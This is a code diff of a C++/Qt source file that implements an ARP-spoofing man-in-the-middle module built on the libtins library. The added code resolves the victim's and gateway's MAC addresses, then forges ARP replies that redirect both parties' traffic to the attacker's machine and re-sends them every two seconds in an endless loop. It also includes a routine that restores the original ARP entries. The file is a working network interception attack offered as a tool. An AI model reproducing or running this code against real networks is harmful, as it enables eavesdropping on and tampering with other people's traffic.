@@ -1,28 +1,24 @@
 #include "Mitm.hh"
 
-Mitm *Mitm::create(const QString &name, const QStringList &args)
+#include <QThread>
+
+#include <unistd.h>
+
+#include "Debug.hh"
+
+Mitm *Mitm::create(const StartModuleArgs & startModuleArgs)
 {
-    if (args.size() < 2)
+    if (startModuleArgs.options.size() < 2)
     {
         return nullptr;
     }
 
     Mitm::Config    config;
 
-    config.victimIP = args[0];
-    config.gatewayIP = args[1];
+    config.victimIP = startModuleArgs.options[0];
+    config.gatewayIP = startModuleArgs.options[1];
 
-
-}
-
-Tins::SnifferConfiguration Mitm::snifferConfiguration()
-{
-    Tins::SnifferConfiguration  config;
-
-    config.set_filter("dst port 53");
-    config.set_promisc_mode(true);
-
-    return config;
+    return new Mitm(startModuleArgs, config);
 }
 
 const QStringList Mitm::help = { "Mitm module usage :",
@@ -31,9 +27,95 @@ const QStringList Mitm::help = { "Mitm module usage :",
 
 /* Class Mitm ****************************************************************/
 
-Mitm::Mitm(const QString & name, const QString & victimIP, const QString & gatewayIP)
-    : AModule("Mitm", name, "wlan0")
+Mitm::Mitm(const StartModuleArgs & startModuleArgs, const Config & config)
+    : AModule("Mitm", startModuleArgs.name, startModuleArgs.iface),
+      m_packetSender(startModuleArgs.iface.toStdString())
 {
+    DEBUG("Mitm::Mitm()", true);
+    Tins::NetworkInterface  attackerIface(m_iface.toStdString());
 
+    m_attacker.ip = attackerIface.addresses().ip_addr;
+    m_attacker.mac = attackerIface.addresses().hw_addr;
+
+    m_gateway.ip = Tins::IPv4Address(config.gatewayIP.toStdString());
+    m_gateway.mac = arpRequest(m_gateway.ip);
+
+    m_victim.ip = Tins::IPv4Address(config.victimIP.toStdString());
+    m_victim.mac = arpRequest(m_victim.ip);
+
+    createOriginalPackets();
+    createPoisonPackets();
+}
+
+Mitm::~Mitm()
+{
+    DEBUG("Mitm::~Mitm() :" << this->objectName(), true);
+}
+
+void Mitm::start()
+{
+    DEBUG("Mitm::start() : Name:" << m_name << " Target:" << QString::fromStdString(m_victim.ip.to_string()), true);
+
+    while (true)
+    {
+        for (Tins::EthernetII & packet : m_poisonPackets)
+            m_packetSender.send(packet);
+
+        this->thread()->sleep(2);
+    }
+}
+
+void Mitm::stop()
+{
+    DEBUG("Mitm::stop()", true);
+    for (quint32 i = 0; i < 2; ++i)
+    {
+        for (Tins::EthernetII & packet : m_originalPackets)
+            m_packetSender.send(packet);
+    }
+}
+
+const Tins::HWAddress<6> Mitm::arpRequest(const Tins::IPv4Address & targetIp)
+{
+    Tins::EthernetII    arpRequest = Tins::ARP::make_arp_request(targetIp, m_attacker.ip, m_attacker.mac);
+    Tins::PDU           *response;
+
+    response = m_packetSender.send_recv(arpRequest);
+
+    if ( ! response)
+    {
+        DEBUG("Mitm::arpRequest() : Can't retrieve" << targetIp << " associated MAC", true);
+        // Thread is still living even if the module is deleted :/
+        stop();
+        return Tins::HWAddress<6>("42");
+    }
+
+    return response->rfind_pdu<Tins::ARP>().sender_hw_addr();
+}
+
+void Mitm::createOriginalPackets()
+{
+    // Tell victim thats gatewayIP is at gatewayMac
+    m_originalPackets.push_back(
+                Tins::ARP::make_arp_reply(m_victim.ip, m_gateway.ip, m_victim.mac, m_gateway.mac)
+    );
+
+    // Tell gateway thats victimIP is at victimMac
+    m_originalPackets.push_back(
+                Tins::ARP::make_arp_reply(m_gateway.ip, m_victim.ip, m_gateway.mac, m_victim.mac)
+    );
+}
+
+void Mitm::createPoisonPackets()
+{
+    // Tell gateway thats victimIP is at attackerMac (target, sender, target, sender)
+    m_poisonPackets.push_back(
+                Tins::ARP::make_arp_reply(m_gateway.ip, m_victim.ip, m_gateway.mac, m_attacker.mac)
+    );
+
+    // Tell victim thats gatewayIP is at attackerMac
+    m_poisonPackets.push_back(
+                Tins::ARP::make_arp_reply(m_victim.ip, m_gateway.ip, m_victim.mac, m_attacker.mac)
+    );
 }
 
